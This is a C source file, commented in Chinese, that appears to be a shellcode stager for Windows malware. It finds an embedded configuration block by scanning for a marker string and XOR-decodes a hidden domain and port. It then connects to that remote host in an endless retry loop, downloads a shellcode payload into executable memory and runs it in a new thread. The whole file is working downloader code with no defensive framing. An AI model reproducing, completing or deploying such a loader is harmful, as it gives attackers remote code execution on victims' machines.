#include"hread.h"

DWORD WINAPI start(PVOID address)
{

	char name[] = { 'n','b','c','l','a','s','s',0 };

	INFO info;
	if (!init(&info))
		return 0;

	DWORD_PTR  eip = fun();
	info.data = eip + GetOffset((PBYTE)eip);
	if (info.data == eip)
		return 0;

	//初始化socket
	WSADATA wsaData;
	if (info.pmWSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
		return 0;

	//创建socket
	info.m_socket = info.pmsocket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (info.m_socket == INVALID_SOCKET)
		goto end;

	//创建buff
	info.buff = info.pmVirtualAlloc(0, sizeof(ShellcodeStr), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (!info.buff)
		goto end;


	for (size_t i = 0; i < sizeof(MODIFY_DATA); i++)
	{
		((char*)(&info.data->DNS[0]))[i] = ((char*)(&info.data->DNS[0]))[i] ^ 97;
	}

	//域名转ip
	ADDRINFOA* ip;
	if (info.pmgetaddrinfo(info.data->DNS, 0, 0, &ip) != 0)
		goto end;

	//开始循环链接 直至成功
	SOCKADDR_IN	 ClientAddr;
	ClientAddr = *((SOCKADDR_IN*)ip->ai_addr);
	ClientAddr.sin_port = info.pmhtons(info.data->Port);
	while (info.pmconnect(info.m_socket, (SOCKADDR*)&ClientAddr, sizeof(ClientAddr)) == SOCKET_ERROR)
	{

	}

	//发送标志获取shellcode
	int rt = info.pmsend(info.m_socket, name, sizeof(name), 0);
	if (rt <= 0)
		goto end;

	WorkThread(&info);

end:
	info.pmWSACleanup();
	if (info.buff)
		info.pmVirtualFree(info.buff, 0, MEM_RELEASE);
	return 0;
}

//用来获取EIP的
DWORD_PTR __declspec(naked) fun()
{
	__asm {
		mov eax, [esp];
		ret;
	}
}

//寻找上线信息
DWORD GetOffset(PBYTE buff)
{

	for (size_t i = 0; i < 1000 ; i++)
	{
		if (buff[i] == 'b' && buff[i+1] == 'h' && buff[i + 2] == 'y' && buff[i + 3] == 'y' && buff[i + 4] == 'i' && buff[i + 5] == 'n' && buff[i + 6] == 'f' && buff[i + 7] == 'o')
		{
			return i + 8;
		}
	}
	return 0;
}

void MyMemcpy(void* dst, void* src, size_t sizes)
{
	__asm {
		mov edi, dst
		mov esi, src
		mov ecx, sizes
		rep movs byte  ptr es : [edi] , byte ptr ds : [esi]
	}
}

DWORD WINAPI WorkThread(PVOID p)
{
	INFO* info = (INFO*)p;
	int len = 0;
	int nSize = 0;
	PBYTE 	buff = info->pmVirtualAlloc(0, 10 * 1024, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!buff)
		return 0;

	do
	{
		nSize = info->pmrecv(info->m_socket, (CHAR*)buff, sizeof(buff), 0);
		//接收出错跳出循环
		if (nSize <= 0)
			goto end;
		//接受的数据拷贝到结构当中
		MyMemcpy(((char*)info->buff) + len, buff, nSize);
		len += nSize;
		if (len == sizeof(ShellcodeStr))
		{
			MyMemcpy(&info->buff->modify_data, info->data, sizeof(MODIFY_DATA));
		}
	} while (len != sizeof(ShellcodeStr));

	HANDLE thread = info->pmCreateThread(0, 0, info->buff, info->buff, 0, 0);
	info->pmWaitForSingleObject(thread, -1);
end:
	info->pmVirtualFree(buff, 0, MEM_RELEASE);
	return 0;
}

